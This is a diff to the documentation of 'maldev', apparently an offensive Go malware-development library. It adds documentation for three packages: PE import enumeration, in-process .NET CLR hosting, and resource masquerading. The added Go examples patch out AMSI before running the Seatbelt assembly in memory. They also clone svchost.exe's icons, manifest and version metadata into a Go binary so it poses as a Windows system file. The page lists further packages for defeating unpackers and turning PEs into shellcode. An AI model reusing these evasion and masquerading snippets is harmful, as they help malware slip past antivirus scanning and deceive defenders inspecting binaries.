@@ -2,9 +2,10 @@
 
 # PE Operations
 
-This page documents the eight PE-related packages in maldev:
+This page documents the nine PE-related packages in maldev:
 
 - **`pe/parse`** -- Parse, inspect, and write PE files (cross-platform)
+- **`pe/imports`** -- Enumerate the PE import table (DLL dependencies + imported function names)
 - **`pe/morph`** -- Mutate UPX section headers to break automatic unpackers
 - **`pe/srdi`** -- Convert a PE/DLL/.NET/VBS/JS into position-independent shellcode via Donut
 - **`pe/cert`** -- Read, write, copy, and strip Authenticode certificates
@@ -323,6 +324,58 @@ func (f *File) WriteBytes() []byte
 ```
 
 **Purpose:** Returns the raw PE bytes. Use this when you need the modified PE in memory (e.g., to feed it to `pe/srdi` or encrypt it for staging).
+
+---
+
+## pe/imports -- PE Import Table Analysis
+
+Package `imports` parses the PE import directory (`IMAGE_DIRECTORY_ENTRY_IMPORT`) to enumerate DLL dependencies and imported function names. Useful for dependency analysis, side-loading reconnaissance, and export-matching for hashing tricks.
+
+**MITRE ATT&CK:** T1106 (Native API -- discovery of imported APIs)
+**Platform:** Cross-platform (operates on raw PE bytes; no process handle required)
+**Detection:** N/A -- static analysis only.
+
+### Types
+
+```go
+type Import struct {
+    DLL      string // Source DLL name (e.g., "kernel32.dll")
+    Function string // Imported function name
+}
+```
+
+### Functions
+
+#### `List`
+
+```go
+func List(path string) ([]Import, error)
+```
+
+**Purpose:** Reads a PE file from disk and returns every `(DLL, Function)` pair declared in the import table.
+
+**Example:**
+
+```go
+package main
+
+import (
+    "fmt"
+    "log"
+
+    "github.com/oioio-space/maldev/pe/imports"
+)
+
+func main() {
+    imps, err := imports.List(`C:\Windows\System32\notepad.exe`)
+    if err != nil {
+        log.Fatal(err)
+    }
+    for _, imp := range imps {
+        fmt.Printf("%s!%s\n", imp.DLL, imp.Function)
+    }
+}
+```
 
 ---
 
@@ -912,3 +965,89 @@ func main() {
     }
 }
 ```
+
+---
+
+## pe/clr -- In-Process .NET CLR Hosting
+
+Package `clr` hosts the .NET Common Language Runtime in the current process via the `ICLRMetaHost` / `ICorRuntimeHost` COM interfaces and executes managed assemblies entirely in memory.
+
+**MITRE ATT&CK:** T1620 (Reflective Code Loading)
+**Platform:** Windows (requires a .NET Framework 4.x runtime)
+**Detection:** Medium -- loading `clr.dll` inside a non-.NET host process is a strong heuristic. AMSI v2 scans every assembly passed to `AppDomain.Load_3`, so call `evasion/amsi.PatchAll()` first for flagged payloads.
+
+See [docs/techniques/pe/clr.md](techniques/pe/clr.md) for the full walkthrough (COM interface chain, AppDomain lifecycle, AMSI interaction).
+
+### Minimal usage
+
+```go
+package main
+
+import (
+    "log"
+    "os"
+
+    "github.com/oioio-space/maldev/evasion/amsi"
+    "github.com/oioio-space/maldev/pe/clr"
+)
+
+func main() {
+    _ = amsi.PatchAll(nil) // required for AMSI-flagged assemblies
+
+    rt, err := clr.Load(nil)
+    if err != nil {
+        log.Fatal(err)
+    }
+    defer rt.Close()
+
+    assembly, err := os.ReadFile("Seatbelt.exe")
+    if err != nil {
+        log.Fatal(err)
+    }
+    if err := rt.ExecuteAssembly(assembly, []string{"-group=all"}); err != nil {
+        log.Fatal(err)
+    }
+}
+```
+
+---
+
+## pe/masquerade -- PE Resource Masquerading
+
+Package `masquerade` extracts manifest, icons, version info, and certificate from any Windows PE, then generates a linkable `.syso` COFF object that embeds those resources into a Go binary at compile time. The resulting Go binary advertises itself as the cloned executable to user-mode inspectors (Explorer properties, `sigcheck`, `Get-AuthenticodeSignature` metadata).
+
+**MITRE ATT&CK:** T1036.005 (Masquerading: Match Legitimate Name or Location)
+**Platform:** Cross-platform (operates on PE bytes)
+**Detection:** Low -- VERSIONINFO/manifest are rarely inspected but can be compared against authentic binaries.
+
+Two approaches:
+
+1. **Pre-built presets** — zero-effort, no source PE needed at build time. Importing the preset package's `init()` writes the `.syso` into the package directory, which the Go toolchain then picks up.
+
+    ```go
+    import _ "github.com/oioio-space/maldev/pe/masquerade/preset/svchost"
+    ```
+
+2. **Programmatic cloning** — extract from any PE on disk:
+
+    ```go
+    import "github.com/oioio-space/maldev/pe/masquerade"
+
+    err := masquerade.Clone(
+        `C:\Windows\System32\svchost.exe`,
+        "resource.syso",
+        masquerade.AMD64,
+        masquerade.AsInvoker,
+    )
+    ```
+
+3. **Composable extraction** — tweak individual fields before emitting:
+
+    ```go
+    res, _ := masquerade.Extract(`C:\Windows\System32\svchost.exe`)
+    res.VersionInfo.OriginalFilename = "myservice.exe"
+    _ = res.GenerateSyso("resource.syso", masquerade.AMD64, masquerade.AsInvoker)
+    ```
+
+See [docs/techniques/pe/masquerade.md](techniques/pe/masquerade.md) for the full walkthrough and available presets.
+
